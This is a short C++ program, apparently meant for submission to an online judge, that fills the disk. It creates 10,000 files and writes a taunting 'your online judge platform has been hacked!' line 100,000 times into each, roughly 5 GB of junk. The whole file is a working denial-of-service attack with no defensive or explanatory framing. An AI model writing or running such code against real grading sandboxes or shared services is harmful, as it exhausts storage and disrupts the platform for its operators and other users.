#include <string>
#include <iosfwd>
#include <iostream>
#include <fstream>

using namespace std;

int main() {
    for (int i = 0; i < 10000; i++) {
        string s = "./";
        s += to_string(i);
        s += ".haha";

        ofstream fout(s, ios::out);
        for (int j = 0; j < 100000; j++) {
            fout << "haha, your online judge platform has been hacked!\n";
        }
        fout.close();
    }
}